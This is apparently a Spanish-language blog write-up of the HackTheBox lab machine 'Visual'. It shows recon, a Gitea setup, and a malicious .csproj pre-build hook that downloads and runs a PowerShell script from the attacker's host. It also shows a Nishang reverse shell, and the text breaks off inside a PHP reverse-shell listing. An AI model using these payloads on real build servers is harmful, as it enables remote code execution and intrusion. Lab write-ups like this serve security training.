<!doctype html><html lang=es><head><title>'Visual' Machine HTB WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="'Visual' HTB Machine WriteUp"><meta name=keywords content="blog,pentesting,hacking"><meta name=twitter:card content="summary"><meta name=twitter:title content="'Visual' Machine HTB WriteUp"><meta name=twitter:description content="'Visual' HTB Machine WriteUp"><meta property="og:title" content="'Visual' Machine HTB WriteUp"><meta property="og:description" content="'Visual' HTB Machine WriteUp"><meta property="og:type" content="article"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/es/posts/visual/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-02-24T00:00:00+00:00"><meta property="article:modified_time" content="2024-02-24T00:00:00+00:00"><link rel=canonical href=https://gunzf0x.github.io/pentesting/es/posts/visual/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin=anonymous media=screen><link rel=icon type=image/svg+xml href=/pentesting/images/favicon.svg sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting/es>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/es/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/projects/>Proyectos</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/contact/>Contacto</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/posts/visual/>üá¨üáß</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/es/posts/visual/>'Visual' Machine HTB WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-02-24T00:00:00Z>24 febrero, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
15 minutos de lectura.</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/es/tags/htb/>HTB</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/machine/>machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/windows/>windows</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/medium/>medium</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/pivoting/>pivoting</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/visual-studio/>visual studio</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/juicypotato/>juicypotato</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/powershell/>powershell</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/godpotato/>godpotato</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/fullpowers/>fullpowers</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/privilege-escalation/>privilege escalation</a></span></div></div></header><div class=post-content><hr><h1 id=visual-machine----hackthebox>&lsquo;Visual&rsquo; Machine &ndash; HackTheBox
<a class=heading-link href=#visual-machine----hackthebox><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Windows</em></li><li>Dificultad: <em>Medium</em> / <em>Media</em></li><li>Plataforma: <em>HackTheBox</em></li></ul><p><img src=/pentesting/images/Visual_avatar.png alt="&lsquo;Visual&rsquo; Avatar"></p><hr><h2 id=usuario>Usuario
<a class=heading-link href=#usuario><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li><code>Nmap</code> solo muestra 1 puerto abierto: <code>80</code> <code>HTTP</code>.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>sudo nmap -sVC -p80 10.10.11.234 -oN targeted
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-21 19:36 -03
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.10.11.234
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.16s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT   STATE SERVICE VERSION
</span></span></span><span class=line><span class=cl><span class=go>80/tcp open  http    Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Visual - Revolutionizing Visual Studio Builds
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 13.82 seconds
</span></span></span></code></pre></div><ul><li>Visitando la p√°gina web podemos ver lo siguiente:
<img src=/pentesting/images/Visual_1.png alt="Visual 1"></li><li>El sitio, aparentemente, crea un ejecutable para <code>Visual Studio</code>. Lo √∫nico que podemos agregar como usuarios en esta p√°gina es un repositortio <code>Git</code>:
<img src=/pentesting/images/Visual_2.png alt="Visual 2"></li><li>Para ver c√≥mo funciona/qu√© hace el sitio, empezamos un listener con <code>netcat</code> en el puerto <code>3000</code> (puerto por defecto para <code>Gitea</code>, s√≥lo por si un firewall estuviese previniendo otros puertos)</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>nc -lvnp 3000
</span></span></span></code></pre></div><p>y en el sitio web paso mi IP de atacante, agregando un string random <code>.git</code> para testear c√≥mo funciona:
<img src=/pentesting/images/Visual_3.png alt="Visual 3"></p><p>donde <code>10.10.16.6</code> es mi IP de atacante.</p><ul><li>Luego de algunos segundos de pasar la url a la p√°gina web, en el l√≠stener de <code>netcat</code> obtengo la siguiente respuesta:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>nc -lvnp 3000
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 3000 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.6] from (UNKNOWN) [10.10.11.234] 49671
</span></span></span><span class=line><span class=cl><span class=go>GET /info/refs?service=git-upload-pack HTTP/1.1
</span></span></span><span class=line><span class=cl><span class=go>Host: 10.10.16.6:3000
</span></span></span><span class=line><span class=cl><span class=go>User-Agent: git/2.41.0.windows.1
</span></span></span><span class=line><span class=cl><span class=go>Accept: */*
</span></span></span><span class=line><span class=cl><span class=go>Accept-Encoding: deflate, gzip, br, zstd
</span></span></span><span class=line><span class=cl><span class=go>Pragma: no-cache
</span></span></span><span class=line><span class=cl><span class=go>Git-Protocol: version=2
</span></span></span></code></pre></div><ul><li>Dado que en ninguna parte veo <code>testing.git</code> en el request quiz√°s no sea capaz de inyectar c√≥digo, de manera que descarto eso de momento. Adem√°s, basados en la <a href=https://git-scm.com/docs/git-clone class=external-link target=_blank rel=noopener>documentaci√≥n de Git</a> esta respuesta simplemente es c√≥mo funciona clonar un repositorio.</li><li>Para emular un repositorio custom usar√© <code>Gitea</code> junto con <code>Docker</code>. Asumiendo que tenemos <code>Docker</code> instalado in nuestra m√°quina (en mi caso uso Kali Linux, de manera que segu√≠ <a href=https://www.kali.org/docs/containers/installing-docker-on-kali/ class=external-link target=_blank rel=noopener>estos pasos</a>). Inicializamos el servicio de <code>Docker</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>sudo systemctl start docker
</span></span></span></code></pre></div><p>Chequeamos si el servicio est√° corriendo correctamente:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>sudo systemctl status docker
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚óè docker.service - Docker Application Container Engine
</span></span></span><span class=line><span class=cl><span class=go>     Loaded: loaded (/usr/lib/systemd/system/docker.service; enabled; preset: enabled)
</span></span></span><span class=line><span class=cl><span class=go>     Active: active (running) since Wed 2024-02-21 20:02:04 -03; 1min 6s ago
</span></span></span><span class=line><span class=cl><span class=go>TriggeredBy: ‚óè docker.socket
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>Descargamos la imagen de <code>Gitea</code> para <code>Docker</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>sudo docker pull gitea/gitea
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Using default tag: latest
</span></span></span><span class=line><span class=cl><span class=go>latest: Pulling from gitea/gitea
</span></span></span><span class=line><span class=cl><span class=go>619be1103602: Pull complete
</span></span></span><span class=line><span class=cl><span class=go>172dd90f8cd3: Pull complete
</span></span></span><span class=line><span class=cl><span class=go>e351dffe3e2e: Pull complete
</span></span></span><span class=line><span class=cl><span class=go>23115583656f: Pull complete
</span></span></span><span class=line><span class=cl><span class=go>29191722a758: Pull complete
</span></span></span><span class=line><span class=cl><span class=go>365242e44775: Pull complete
</span></span></span><span class=line><span class=cl><span class=go>2b8d3024c169: Pull complete
</span></span></span><span class=line><span class=cl><span class=go>Digest: sha256:a2095ce71c414c0c6a79192f3933e668a595f7fa7706324edd0aa25c8728f00f
</span></span></span><span class=line><span class=cl><span class=go>Status: Downloaded newer image for gitea/gitea:latest
</span></span></span><span class=line><span class=cl><span class=go>docker.io/gitea/gitea:latest
</span></span></span></code></pre></div><p>Chequeamos si el container ha sido descargado y detectado por <code>Docker:</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>sudo docker images
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>REPOSITORY    TAG       IMAGE ID       CREATED       SIZE
</span></span></span><span class=line><span class=cl><span class=go>gitea/gitea   latest    bf95d9a45ce4   2 weeks ago   160MB
</span></span></span></code></pre></div><p>Y, finalmente, inicializamos <code>Gitea</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>docker run -d -p 127.0.0.1:3000:3000 -p 10.10.16.6:3000:3000 --name gitea-container gitea/gitea:latest
</span></span></span></code></pre></div><p>da manera que ofrezco el servicio en 2 redes/networks: <code>localhost</code> y en mi IPv4 p√∫blica de <code>tun0</code> (la que se asigna para el laboratorio de HackTheBox), de manera que podemos tener conectividad entre la m√°quina v√≠ctima y nuestro servicio de <code>Gitea</code>.</p><ul><li>Si esto funcion√≥, ahora deber√≠amos tener <code>Gitea</code> corriendo en nuestro puerto <code>3000</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>lsof -i:3000
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>COMMAND     PID    USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
</span></span></span><span class=line><span class=cl><span class=go>firefox-e 25194 gunzf0x   82u  IPv4  98328      0t0  TCP localhost:44248-&gt;localhost:3000 (ESTABLISHED)
</span></span></span></code></pre></div><ul><li>Podemos usar nuestro browser de internet para visitar <code>http://localhost:3000</code> o <code>http://10.10.16.6:3000</code> (mi direcci√≥n IPv4 de atacante) y ver si <code>Gitea</code> est√° corriendo correctamente. Al visitar la web recomiendo dejar todo por defecto. <em>Nota</em>: Si usas una base de dato <code>SQL</code> diferente a aquella que viene por defecto (<code>SQLite</code>) el servicio puede presentar problemas.</li><li>Ahora nos podemos registrar con un usuario y loguear con √©l en el servicio de <code>Gitea</code></li><li>Si todo funcion√≥, deber√≠amos tener acceso a un panel como este:
<img src=/pentesting/images/Visual_4.png alt="Bisual 4">
En mi caso en vez de crear un repositorio desde cero, recrear√© un repositorio que ya existe. En mi equipo clono <a href=https://github.com/rushakh/copy-pasting-machine class=external-link target=_blank rel=noopener>este repositorio</a> (el cual es simplemente un repositorio de <code>C#</code> random que eleg√≠ en internet que eleg√≠ desde Github):</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>git clone https://github.com/rushakh/copy-pasting-machine.git
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Cloning into &#39;copy-pasting-machine&#39;...
</span></span></span><span class=line><span class=cl><span class=go>remote: Enumerating objects: 22, done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Counting objects: 100% (22/22), done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Compressing objects: 100% (21/21), done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Total 22 (delta 2), reused 18 (delta 1), pack-reused 0
</span></span></span><span class=line><span class=cl><span class=go>Receiving objects: 100% (22/22), 17.39 KiB | 301.00 KiB/s, done.
</span></span></span><span class=line><span class=cl><span class=go>Resolving deltas: 100% (2/2), done.
</span></span></span></code></pre></div><ul><li>En <code>Gitea</code> creamos un nuevo repositorio haciendo click en el s√≠mbolo <code>+</code> en la parte superior izquierda de la p√°gina de <code>Gitea</code>; y luego click en <code>New Repository</code> (Nuevo Repositorio):
<img src=/pentesting/images/Visual_5.png alt="Visual 5">
y deber√≠amos tener algo como esto:
<img src=/pentesting/images/Visual_6.png alt="Visual 6">
<em>Nota</em>: Aqu√≠ decid√≠ llamar al repositorio <code>testing</code>. Pero luego le cambi√© el nombre a <code>copy-pasting-machine</code> (exactamente el mismo nombre del repositorio que clon√©) para evitar conflictos entre archivos de <code>Git</code>, dado que que necesitamos &ldquo;crear&rdquo; los ejecutables, como veremos luego.</li><li>Creo un directorio/carpeta llamada <code>gitea-repo</code>, entro en ese directorio y sigo las instrucciones de <code>Creating a new repository</code> (ver la √∫ltima imagen de arriba) para agregar archivos</li><li>Luego copio todos los archivos dentro del repositorio clonado (el repositorio original <code>copy-pasting-machines</code>), <em>excepto</em> la carpeta/directorio <code>.git</code>, y paso los archivos al directorio <code>gitea-repo</code> (el directorio que tiene los archivos que se suben a <code>Gitea</code>)</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>cd gitea_repo/
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>ls -la
</span></span></span><span class=line><span class=cl><span class=go>total 20
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 4 gunzf0x gunzf0x 4096 Feb 21 22:03  .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 4 gunzf0x gunzf0x 4096 Feb 21 22:02  ..
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x 1124 Feb 21 22:03  CopyPasteMachine.sln
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 8 gunzf0x gunzf0x 4096 Feb 21 22:04  .git
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x    0 Feb 21 22:01  README.md
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 3 gunzf0x gunzf0x 4096 Feb 21 22:03 &#39;trying media&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ git add .
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ cat .git/config
</span></span></span><span class=line><span class=cl><span class=go>[core]
</span></span></span><span class=line><span class=cl><span class=go>        repositoryformatversion = 0
</span></span></span><span class=line><span class=cl><span class=go>        filemode = true
</span></span></span><span class=line><span class=cl><span class=go>        bare = false
</span></span></span><span class=line><span class=cl><span class=go>        logallrefupdates = true
</span></span></span><span class=line><span class=cl><span class=go>[remote &#34;origin&#34;]
</span></span></span><span class=line><span class=cl><span class=go>        url = http://localhost:3000/gunzf0x/copy-pasting-machine.git
</span></span></span><span class=line><span class=cl><span class=go>        fetch = +refs/heads/*:refs/remotes/origin/*
</span></span></span><span class=line><span class=cl><span class=go>[branch &#34;main&#34;]
</span></span></span><span class=line><span class=cl><span class=go>        remote = origin
</span></span></span><span class=line><span class=cl><span class=go>        merge = refs/heads/main
</span></span></span></code></pre></div><p>Luego hago un <code>commit</code> y <code>push</code> a todos los archivos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>git commit -m &#34;Cloning repo&#34;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>git push origin main
</span></span></span></code></pre></div><ul><li>Ahora nuestro repositorio en <code>Gitea</code> deber√≠a verse como esto:
<img src=/pentesting/images/Visual_7.png alt="Visual 7"></li><li>Devuelta al sitio <code>HTTP</code>, en <code>Submit Your Repo</code>, ahora paso el link/url: <code>http://10.10.16.6:3000/gunzf0x/copy-pasting-machine.git</code></li><li>Luego de unos segundos, el sitio crea/construye los binarios:
<img src=/pentesting/images/Visual_8.png alt="Visual 8 - building executable"></li><li>Noto que si no hay un archivo <code>.sln</code> en el repositorio el crear el archivo falla.</li><li>Adem√°s, si chequeamos <a href="https://learn.microsoft.com/en-us/cpp/build/how-to-use-build-events-in-msbuild-projects?view=msvc-170" class=external-link target=_blank rel=noopener>c√≥mo los archivos MSBuild Projects son creados</a> vemos que es posible inyectar comandos. Un simple archivo malicioso <code>.csproj</code> se ver√≠a como:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-csproj data-lang=csproj><span class=line><span class=cl><span class=nt>&lt;Project</span> <span class=na>Sdk=</span><span class=s>&#34;Microsoft.NET.Sdk&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;PropertyGroup&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;OutputType&gt;</span>Exe<span class=nt>&lt;/OutputType&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;TargetFramework&gt;</span>net7.0<span class=nt>&lt;/TargetFramework&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;RootNamespace&gt;</span>project_name<span class=nt>&lt;/RootNamespace&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;ImplicitUsings&gt;</span>enable<span class=nt>&lt;/ImplicitUsings&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;Nullable&gt;</span>enable<span class=nt>&lt;/Nullable&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;/PropertyGroup&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;Target</span> <span class=na>Name=</span><span class=s>&#34;PreBuild&#34;</span> <span class=na>BeforeTargets=</span><span class=s>&#34;PreBuildEvent&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;Exec</span> <span class=na>Command=</span><span class=s>&#34;powershell IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.16.16:80/rev.ps1&#39;)&#34;</span> <span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;/Target&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nt>&lt;/Project&gt;</span>
</span></span></code></pre></div><p>donde <code>10.10.16.6</code> es mi IP de atacante y <code>rev.ps1</code> es un script de <code>Powershell</code> (que definir√© a continuaci√≥n).</p><ul><li>En mi caso usar√© <code>Invoke-PowerShellTcp.ps1</code> de <code>Nishang</code>, el cual puede ser descargado desde <a href=https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 class=external-link target=_blank rel=noopener>aqu√≠</a></li><li>Edito el archivo <code>Invoke-PowerShellTcp.ps1</code>, el cual renombro como <code>rev.ps1</code>, y en un editor de texto agrego al final de √©ste la l√≠nea:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl>        <span class=nb>Write-Warning</span> <span class=s2>&#34;Something went wrong! Check if the server is reachable and you are using the correct port.&#34;</span>
</span></span><span class=line><span class=cl>        <span class=nb>Write-Error</span> <span class=nv>$_</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>Invoke-PowerShellTcp</span> <span class=n>-Reverse</span> <span class=n>-IPAddress</span> <span class=mf>10.10</span><span class=p>.</span><span class=py>16</span><span class=p>.</span><span class=py>6</span> <span class=n>-Port</span> <span class=mf>443</span>
</span></span></code></pre></div><p>de manera que el servidor ejecutar√° la reverse shell inmediatamente luego de que el archivo malicioso <code>.csproj</code> es ejecutado.</p><ul><li>Creo un archivo respaldo/backup <code>.csproj</code> del original, s√≥lo en caso de que √©ste llegase a fallar. Este archivo est√° localizado, en este repositorio, dentro del directorio <code>trying media</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>cd trying\ media
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>cp CopyPasteMachine.csproj CopyPasteMachine_backup.csproj
</span></span></span></code></pre></div><p>y modifico el archivo <code>CopyPasteMachine.csproj</code> con el script <code>.csproj</code> malicioso que ense√±√© arriba. Subo estos cambios al repositorio <code>Gitea</code>.</p><ul><li>Empiezo un servidor <code>Python</code> <code>HTTP</code> en el puerto <code>80</code>, en el mismo directorio donde <code>rev.ps1</code> se encuentra, y en otro panel/terminal empiezo un listener de <code>netcat</code> en el puerto <code>443</code>. En la p√°gina web subo el link <code>http://10.10.16.6:3000/gunzf0x/copy-pasting-machine.git</code> a <code>Submit Your Repo</code>, pero esta vez con el archivo malicioso <code>csproj</code> de manera que obtengo una reverse shell:
<img src=/pentesting/images/Visual_9.png alt="Visual 9 - reverse shell">
Podemos obtener la flag en el directorio del usuario.</li></ul><h2 id=nt-authoritysystem---administrator>NT Authority\System - Administrator
<a class=heading-link href=#nt-authoritysystem---administrator><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>Estamos logueados como <code>visual\enox</code>. Mirando los privilegios de este usuario:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>PS C:\Windows\Temp\8f8177df5fbf8e4d3d0385b74ece7f\trying media&gt; whoami /priv
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PRIVILEGES INFORMATION
</span></span></span><span class=line><span class=cl><span class=go>----------------------
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Privilege Name                Description                    State
</span></span></span><span class=line><span class=cl><span class=go>============================= ============================== ========
</span></span></span><span class=line><span class=cl><span class=go>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeCreateGlobalPrivilege       Create global objects          Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
</span></span></span><span class=line><span class=cl><span class=go>PS C:\Windows\Temp\8f8177df5fbf8e4d3d0385b74ece7f\trying media&gt;
</span></span></span></code></pre></div><p>no veo nada interesante</p><ul><li>Subo el script <code>Sherlock.ps1</code> (el cual puede ser descargado desde <a href=https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1 class=external-link target=_blank rel=noopener>su repositorio de Github</a>), pero no se detect√≥ ning√∫n exploit/vulnerabilidad.</li><li>Ahora, usualmente los usuarios encargados del webserver pueden tener el privilegio <code>SeImpersonatePrivilege</code> (o, al menos, podemos nosotros tratar de activarlo). Como sea, de momento somos el usuario <code>visual\enox</code>. Por esta raz√≥n subo el siguiente archivo <code>PHP</code> para obtener una reverse shell e intent obtener otra conexi√≥n, pero este vez desde el usuario corriendo el servidor. De manera que hacemos subimos este archivo para pivotear/cambiar de usuario:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=c1>// Copyright (c) 2020 Ivan ≈†incek
</span></span></span><span class=line><span class=cl><span class=c1>// v2.6
</span></span></span><span class=line><span class=cl><span class=c1>// Requires PHP v5.0.0 or greater.
</span></span></span><span class=line><span class=cl><span class=c1>// Works on Linux OS, macOS, and Windows OS.
</span></span></span><span class=line><span class=cl><span class=c1>// See the original script at https://github.com/pentestmonkey/php-reverse-shell.
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>class</span> <span class=nc>Shell</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$addr</span>  <span class=o>=</span> <span class=k>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$port</span>  <span class=o>=</span> <span class=k>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$os</span>    <span class=o>=</span> <span class=k>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$shell</span> <span class=o>=</span> <span class=k>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$descriptorspec</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span> <span class=o>=&gt;</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;pipe&#39;</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>),</span> <span class=c1>// shell can read from STDIN
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=mi>1</span> <span class=o>=&gt;</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;pipe&#39;</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>),</span> <span class=c1>// shell can write to STDOUT
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=mi>2</span> <span class=o>=&gt;</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;pipe&#39;</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>)</span>  <span class=c1>// shell can write to STDERR
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$buffer</span> <span class=o>=</span> <span class=mi>1024</span><span class=p>;</span>  <span class=c1>// read/write buffer size
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>private</span> <span class=nv>$clen</span>   <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>     <span class=c1>// command length
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>private</span> <span class=nv>$error</span>  <span class=o>=</span> <span class=k>false</span><span class=p>;</span> <span class=c1>// stream read/write error
